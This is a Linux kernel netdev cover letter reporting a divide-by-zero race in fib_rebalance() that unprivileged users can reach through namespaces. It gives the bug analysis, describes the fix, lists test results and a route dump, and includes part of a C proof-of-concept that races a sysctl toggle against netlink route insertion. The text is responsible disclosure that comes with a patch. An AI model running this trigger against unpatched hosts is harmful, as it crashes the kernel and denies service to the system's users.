Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AE21146AEE4
	for <stable@vger.kernel.org>; Thu, 27 Aug 2026 18:26:37 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787855200; cv=none; b=KDxI4Hf5Y5NSecx/NScdiRKB9gSq9O9xGrgNc/yCiUOV8no6qoGu9PHR7mBWNlWtY5wxU+mbNWG/9pfVgaSpM/OmrcuziEmWrF1kKcONWPldsO4u5DUNSest3eu76ueUU+Tz7JpZRBP3gM/Vr3/vKtX/e9UqOrvstVf1BY1gV5E=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787855200; c=relaxed/simple;
	bh=Xw7JkTmBwOwQjEKP5E/WG9SpNRM1Sbc6A7atvPIdAFg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UQJ+cpaWQhok7ec+hm+EaqhoGbtX2rEX60b7AKeUZnMvUgcSmaQp5cCogRg8SHj5qub0LpSxFbM90RfPi+Rbs0DvhODO5wVqU9UGPCXK3ekZYPKwdJNBM0lmZBPsNyCTmUFbJ1xv2me0FgfmNCanEFySkf2Sq1/1x9n6b1j9VyM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=IPFv1Z2O; arc=none smtp.client-ip=209.85.210.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="IPFv1Z2O"
Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-84f3ab8750cso245153b3a.0
        for <stable@vger.kernel.org>; Thu, 27 Aug 2026 11:26:37 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1787855197; x=1788459997; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=GzNQySfn9eTBronkRpJmZqEcyrlS+bCyoGLpHbq9qw8=;
        b=IPFv1Z2Ootz2+KbBTB3X5LwcoNQTZK16ehWHzhvzLTKhjxVhWqVLSlDrlewLNAxGAi
         6PMZLCZ9QKNsAtM7zIidmxPHlDkRgffD9oLlsivYoAo87JLPg6om8TqWiOtbb/w7wXYL
         Kr6+tT00aEykltA22Bvb29lv35ciqWr3ormb1yrFLv6AuWSHg09/yFjIEb4nzTcuJmRk
         8XvtWJiORYN2yi3la0xFvb+n0PE3SAUKR6wvGzFyejlyN1fniboKUXs/U9gYnT8YQUCr
         DsvJWXxVWQZ8PzMw52Uo2JP5OfPt/Ag2AhyI5caAZc9XVdvh6WLXHtMQGocyUp4KmXtt
         3U5w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1787855197; x=1788459997;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=GzNQySfn9eTBronkRpJmZqEcyrlS+bCyoGLpHbq9qw8=;
        b=RObCGpkcmqqzMXMXHUmMzQrFKv4POcd9hkFhkA8ofSa8QHVAZ4FYkmhJQ/xDg42m+I
         DvqZOo7YdzbqcoWfzf4J2tyLUn0wi8499fsN6xblvkDlMZwO4+ZG0tLoN70mybwLZ53N
         0YYp5c4dcgL6jGcmjk5I5x07ac2xiplxCI9qaTBAjgC8w/B5kL8TVlBiP2Y9DLccfO9l
         z76GzycxHh6vzZrrteSK5MVn9X4y+Cqjq8uKnvGuU9XIRnohUwPEpWHR9T2BncdUPTZq
         +eiUnpxXoyk/1pYWH+F5hkmQCnK6oascJQoMipQl3Gx6r4PxcdYkUQGwBBxk7VBAG2vn
         i10Q==
X-Forwarded-Encrypted: i=1; AHgh+RrG/Iupz+LZuJ1jWgEIDJmpVCKzJ0GUrZd802iQ4n0/g8MyhrAVfQFzFi3xmVWnQ0JLRbWvIi4=@vger.kernel.org
X-Gm-Message-State: AFuF++kksVKkWGEatyZqNja6NKsTe8XV3Xa11/99P/Xb8gq/xgS0ojHo
	1PXZsjFyBE4bFXj1p7aoUOgKwjGsCQMB69QqQPFHwwqpJCF/+L/7sjipd2akMTfqh8Xk
X-Gm-Gg: AR+sD12AiUYHzcfFfTzHriTSLkwZAoUEgDNwsgrZrtsMKtVMvj6sz2bGdCVRadjWgBb
	3GIjwbSyXwPXPHD4r3Y5UP9x2d1eKRlmDythAmh9iPwklen9UXiuTKbeNGRiaesrKLZQbpyk4dz
	jh2ZeKN7UAC5TV6vdk61M2AYwsDBCMRD+9AY4fZMbM6J6Do5/PBTatdVBT+t5qNG5m/Iy4dg64k
	0cEOeFdswjI2LbfYxpmDNHbSD1/6zhg1OpRb1dnwerwwWGSacKH60Sxfjtk8bfT/Cjz7WJC1HcH
	cNwR/+lZoEi4c1y7avZIo7avIyL0oh9GNarWZPFvB6UZk1hZscA6EyV7vSIsOMLDNT0L63WQn1s
	d+7VeUDuKhcirCFZSmKLJjos1MW6q9CYHSvDrLKVqEpVlQgfklm1LloGFIHkAkR6Wraae7/2MMO
	tOhuKNcNxs5f/DFnprLJSTXmxWPY2T9naa/VWhATegue2wH4/dcmo/vLxi2PLZRyw8xUVrau8S7
	r7ZY5tll1ZM5A==
X-Received: by 2002:a05:6a00:2d84:b0:845:ce5f:c926 with SMTP id d2e1a72fcca58-8562839d89bmr2160061b3a.1.1787855196396;
        Thu, 27 Aug 2026 11:26:36 -0700 (PDT)
Received: from gmail.com ([202.201.12.226])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-8535cf4462esm2333905b3a.53.2026.08.27.11.26.31
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 27 Aug 2026 11:26:35 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: linux-kernel@vger.kernel.org,
	David Ahern <dsahern@kernel.org>,
	Ido Schimmel <idosch@nvidia.com>,
	"David S. Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	=?UTF-8?q?Peter=20N=C3=B8rlund?= <pch@ordbogen.com>,
	stable@vger.kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v2 0/1] ipv4: avoid divide by zero in fib_rebalance
Date: Thu, 27 Aug 2026 18:25:13 +0000
Message-ID: <20260827182514.4667-1-zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/fib_semantics.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

fib_rebalance() computes the total eligible nexthop weight in one pass
and programs upper bounds in a second pass. A concurrent
ignore_routes_with_linkdown update can make the first pass return zero
while the second pass sees an eligible nexthop, causing the upper-bound
calculation to divide by zero.

Route insertion and link-state update paths invoke fib_rebalance() under
RTNL, while this sysctl update is not serialized by RTNL. If all
nexthops are link-down, the race can leave total at zero while the
second pass reaches the division. The root-cause fact was introduced by
commit 0e884c78ee19
("ipv4: L3 hash-based multipath"), which added the two-pass hash
threshold calculation. Fixes therefore points to that earliest commit.

The fix sets upper_bound to -1 for every nexthop when the first pass
reports a zero total. This skips the division and follows the IPv6 fix
in commit d2c26c2911dd ("ipv6: avoid divide by zero in
rt6_multipath_rebalance"), which was applied to net/main on 2026-08-20.
The change does not add locking or work to route lookup or rebalance
paths.

Changes in v2:
  - Replace the v1 RTNL sysctl serialization with the total == 0 guard
    in fib_rebalance(), following the applied IPv6 fix.
  - v1 Link: https://lore.kernel.org/all/cover.1786812660.git.zihanx@nebusec.ai

Changing ignore_routes_with_linkdown does not rebalance already
installed multipath routes. Existing upper bounds are recomputed by
route insertion and netdevice link-state events; a sysctl write alone
does not immediately recompute them. This pre-existing behavior is
unchanged by the patch.

The PoC explicitly sets the veth peer v1 administratively down before
bringing v0 up. This leaves v0 UP with no carrier and causes all 200
nexthops to be marked link-down. The captured state dump below confirms
the veth state and the 200 link-down nexthops.

On the patched kernel, the static PoC completed for root and for an
unprivileged user in a user and network namespace. Neither run produced
an Oops, divide error, panic, or fib_rebalance report.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
The default timeout is 30 seconds; POC_TIMEOUT=30 was used for the
captured runs.

Complete PoC output from the patched kernel (root):

    nh_count=200 on_usec=200 off_usec=50 route_cpu=0 toggle_cpu=1 timeout=30
    completed: worker threads stopped

Complete PoC output from the patched kernel (unprivileged user namespace):

    nh_count=200 on_usec=200 off_usec=50 route_cpu=0 toggle_cpu=1 timeout=30
    completed: worker threads stopped

The root and unprivileged return codes were both zero. The clean
unpatched comparison at the same 24ef02f934ee source revision produced
an Oops: divide error in fib_rebalance+0x123/0x1b0 for both root and UID
1000. Those comparison logs were decoded with
scripts/decode_stacktrace.sh.

The following post-run veth and route dump is copied verbatim from the
patched root run:

----BEGIN veth/linkdown state----

links:
v0@v1            LOWERLAYERDOWN 7e:08:c9:f7:58:6b <NO-CARRIER,BROADCAST,MULTICAST,UP,M-DOWN> 
v1@v0            DOWN           12:7e:52:a5:8b:08 <BROADCAST,MULTICAST> 
route_linkdown_count:
201
route:
198.51.100.1 linkdown 
	nexthop via 10.0.0.2 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.3 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.4 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.5 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.6 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.7 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.8 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.9 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.10 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.11 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.12 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.13 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.14 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.15 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.16 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.17 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.18 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.19 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.20 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.21 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.22 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.23 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.24 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.25 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.26 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.27 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.28 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.29 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.30 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.31 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.32 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.33 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.34 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.35 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.36 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.37 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.38 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.39 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.40 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.41 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.42 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.43 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.44 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.45 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.46 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.47 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.48 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.49 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.50 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.51 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.52 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.53 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.54 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.55 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.56 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.57 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.58 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.59 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.60 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.61 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.62 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.63 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.64 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.65 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.66 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.67 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.68 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.69 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.70 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.71 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.72 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.73 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.74 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.75 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.76 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.77 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.78 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.79 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.80 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.81 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.82 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.83 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.84 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.85 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.86 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.87 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.88 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.89 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.90 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.91 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.92 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.93 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.94 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.95 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.96 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.97 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.98 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.99 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.100 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.101 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.102 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.103 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.104 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.105 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.106 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.107 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.108 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.109 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.110 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.111 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.112 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.113 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.114 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.115 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.116 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.117 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.118 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.119 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.120 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.121 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.122 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.123 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.124 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.125 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.126 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.127 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.128 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.129 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.130 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.131 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.132 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.133 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.134 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.135 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.136 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.137 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.138 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.139 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.140 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.141 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.142 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.143 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.144 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.145 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.146 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.147 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.148 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.149 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.150 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.151 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.152 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.153 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.154 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.155 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.156 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.157 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.158 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.159 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.160 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.161 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.162 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.163 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.164 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.165 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.166 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.167 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.168 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.169 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.170 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.171 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.172 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.173 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.174 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.175 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.176 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.177 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.178 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.179 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.180 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.181 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.182 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.183 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.184 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.185 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.186 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.187 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.188 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.189 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.190 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.191 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.192 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.193 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.194 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.195 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.196 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.197 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.198 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.199 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.200 dev v0 weight 1 onlink linkdown 
	nexthop via 10.0.0.201 dev v0 weight 1 onlink linkdown 

-----END veth/linkdown state-----

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define DEV0 "v0"
#define DEV1 "v1"
#define DEV0_ADDR "10.0.0.1/24"
#define SYSCTL_PATH "/proc/sys/net/ipv4/conf/" DEV0 "/ignore_routes_with_linkdown"

#define DEFAULT_NH_COUNT 200U
#define DEFAULT_ON_USEC 200U
#define DEFAULT_OFF_USEC 50U
#define DEFAULT_TIMEOUT 30U

#define MAX_MP_BUF 8192
#define MAX_ROUTE_REQ 16384

static volatile sig_atomic_t stop_flag;

struct config {
	unsigned int nh_count;
	unsigned int on_usec;
	unsigned int off_usec;
	unsigned int timeout_sec;
	int route_cpu;
	int toggle_cpu;
};

struct route_state {
	int fd;
	size_t msg_len;
	struct nlmsghdr *nlh;
	uint32_t *dst;
};

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fputc('\n', stderr);
	exit(EXIT_FAILURE);
}

static unsigned int env_u32(const char *name, unsigned int def, unsigned int min,
			       unsigned int max)
{
	char *end = NULL;
	const char *value = getenv(name);
	unsigned long parsed;

	if (!value || !*value)
		return def;

	errno = 0;
	parsed = strtoul(value, &end, 0);
	if (errno || !end || *end || parsed < min || parsed > max)
		die("invalid %s value: %s", name, value);

	return (unsigned int)parsed;
}

static int env_i32(const char *name, int def, int min, int max)
{
	char *end = NULL;
	const char *value = getenv(name);
	long parsed;

	if (!value || !*value)
		return def;

	errno = 0;
	parsed = strtol(value, &end, 0);
	if (errno || !end || *end || parsed < min || parsed > max)
		die("invalid %s value: %s", name, value);

	return (int)parsed;
}

static void load_config(struct config *cfg)
{
	memset(cfg, 0, sizeof(*cfg));
	cfg->nh_count = env_u32("POC_NH_COUNT", DEFAULT_NH_COUNT, 2, 240);
	cfg->on_usec = env_u32("POC_ON_USEC", DEFAULT_ON_USEC, 1, 1000000);
	cfg->off_usec = env_u32("POC_OFF_USEC", DEFAULT_OFF_USEC, 1, 1000000);
	cfg->timeout_sec = env_u32("POC_TIMEOUT", DEFAULT_TIMEOUT, 1, 86400);
	cfg->route_cpu = env_i32("POC_ROUTE_CPU", 0, 0, 1024);
	cfg->toggle_cpu = env_i32("POC_TOGGLE_CPU", 1, 0, 1024);
}

static void run_cmd(const char *fmt, ...)
{
	char cmd[512];
	va_list ap;
	int rc;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	rc = system(cmd);
	if (rc == -1)
		die("system(%s) failed: %s", cmd, strerror(errno));
	if (!WIFEXITED(rc) || WEXITSTATUS(rc) != 0)
		die("command failed (%d): %s", rc, cmd);
}

static void set_affinity(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		fprintf(stderr, "warning: sched_setaffinity(cpu=%d) failed: %s\n",
			cpu, strerror(errno));
}

static void spin_usec(unsigned int usec)
{
	struct timespec start, now;
	unsigned long long elapsed;

	if (!usec)
		return;

	if (clock_gettime(CLOCK_MONOTONIC, &start) != 0)
		return;

	for (;;) {
		if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
			return;

		elapsed = (unsigned long long)(now.tv_sec - start.tv_sec) * 1000000ULL;
		elapsed += (unsigned long long)(now.tv_nsec - start.tv_nsec) / 1000ULL;
		if (elapsed >= usec)
			return;
		asm volatile("" ::: "memory");
	}
}

static void write_sysctl_value(int fd, char value)
{
	char buf[2] = { value, '\n' };

	if (lseek(fd, 0, SEEK_SET) < 0)
		die("lseek(%s) failed: %s", SYSCTL_PATH, strerror(errno));
	if (write(fd, buf, sizeof(buf)) != (ssize_t)sizeof(buf))
		die("write(%s=%c) failed: %s", SYSCTL_PATH, value, strerror(errno));
}

static int addattr_l(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
		     const void *data, size_t alen)
{
	size_t len = RTA_LENGTH(alen);
	size_t newlen = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(len);
	struct rtattr *rta;

	if (newlen > maxlen)
		return -1;

	rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len = len;
	if (alen)
		memcpy(RTA_DATA(rta), data, alen);
	nlh->nlmsg_len = newlen;
	return 0;
}

static size_t build_multipath(char *buf, size_t buflen, int ifindex,
			      unsigned int nh_count)
{
	size_t off = 0;
	unsigned int i;

	for (i = 0; i < nh_count; i++) {
		size_t nh_start = off;
		struct rtnexthop *rtnh;
		struct rtattr *gw;
		uint32_t gw_addr = htonl(0x0a000000U | (i + 2));

		if (off + RTNH_ALIGN(sizeof(*rtnh)) + RTA_SPACE(sizeof(gw_addr)) > buflen)
			die("multipath buffer too small");

		rtnh = (struct rtnexthop *)(buf + off);
		memset(rtnh, 0, sizeof(*rtnh));
		rtnh->rtnh_ifindex = ifindex;
		rtnh->rtnh_flags = RTNH_F_ONLINK;
		off += RTNH_ALIGN(sizeof(*rtnh));

		gw = (struct rtattr *)(buf + off);
		gw->rta_type = RTA_GATEWAY;
		gw->rta_len = RTA_LENGTH(sizeof(gw_addr));
		memcpy(RTA_DATA(gw), &gw_addr, sizeof(gw_addr));
